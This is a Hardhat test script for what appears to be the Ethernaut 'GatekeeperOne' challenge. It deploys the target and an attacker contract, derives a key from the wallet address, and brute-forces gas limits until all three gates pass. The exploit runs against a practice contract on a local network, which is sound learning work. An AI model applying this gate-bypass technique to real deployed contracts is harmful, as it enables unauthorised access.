/* eslint-disable no-undef */
// Right click on the script name and hit "Run" to execute
import { expect } from "chai";
import { network } from "hardhat";
import { GatekeeperOne } from "../types/ethers-contracts/GatekeeperOne.js";
import { GatekeeperOneHacker } from "../types/ethers-contracts/GatekeeperOneHacker.js";

const { ethers } = await network.connect();

import { Contract, Signer } from "ethers";


describe("GatekeeperOneHacker", function () {
  let deployedGatekeeperOne: any;
  let hacker: GatekeeperOneHacker;
  it("test initial value", async function () {
    const GatekeeperOne = await ethers.getContractFactory("GatekeeperOne");
    deployedGatekeeperOne = await GatekeeperOne.deploy();
    console.log("gatekeeperOne deployed at:" + await deployedGatekeeperOne.getAddress());
    const result = await deployedGatekeeperOne.entrant();
    expect(result).to.equal('0x0000000000000000000000000000000000000000');
  });
  it('deploys gatekeeper hacker', async () => {
    const GatekeeperOneHacker = await ethers.getContractFactory("GatekeeperOneHacker");
    hacker = await GatekeeperOneHacker.deploy(await deployedGatekeeperOne.getAddress());
    console.log("gatekeeperOne deployed at:" + await hacker.getAddress());
    expect(await hacker.gasCostOfGateOne()).to.equal(140);
    const result = await hacker.gatekeeper();
    expect(await deployedGatekeeperOne.getAddress()).to.equal(result);
  })
  it('Gate 3 = checks key', async () => {
    const [wallet] = await ethers.getSigners();
    const computedKey = await hacker.getDerivedKey(wallet.address);
    const result = await hacker.checkKey(computedKey, wallet.address);
    expect(result[0]).to.equal(true);
    expect(result[1]).to.equal(true);
    expect(result[2]).to.equal(true);
  })
  it.skip("Measure GateOne offset via estimateGas", async () => {
    const [wallet] = await ethers.getSigners();

    const tx = await hacker.measureGateOneOffset({ from: wallet.address });
    const result = await tx.wait();
    console.log("Measured GateOne offset:", result?.gasUsed);
    expect(result?.gasUsed).to.be.gt(0);
  });


  it("Gate 1, 2, and 3 via hacker contract (EIP-150 adjusted with empirical offset)", async () => {
    const [wallet] = await ethers.getSigners();
    const key = await hacker.getDerivedKey(wallet.address); // bytes8 key
    console.log("Wallet that should be entrant: ", wallet.address);
    let passed = false;
    let successfulGasLimit: number | undefined;

    const empiricalStart = 200_000;
    const empiricalEnd = 300_000;
    const tx2 = await deployedGatekeeperOne.entrant();
    console.log({ tx2 })

    for (let gasLimit = empiricalStart; gasLimit <= empiricalEnd; gasLimit++) {
      if (passed) {
        break; // Exit loop if already successful
      }
      try {
        const tx = await hacker.connect(wallet).callEnter(key, gasLimit, { gasLimit: 1_000_000 });
        const receipt = await tx.wait();
        console.log("✅ Success!", { gasLimit });
        const entrant = await deployedGatekeeperOne.entrant();
        console.log("Entrant address:", entrant);
        passed = true;
        break;
      } catch (err) {
        const reason = err?.error?.message || err?.reason || err?.toString();
        // optional: log gasleft mod 8191 if you instrument the contract
      }
    }

    expect(passed).to.equal(true);
    console.log({ successfulGasLimit });
  });



});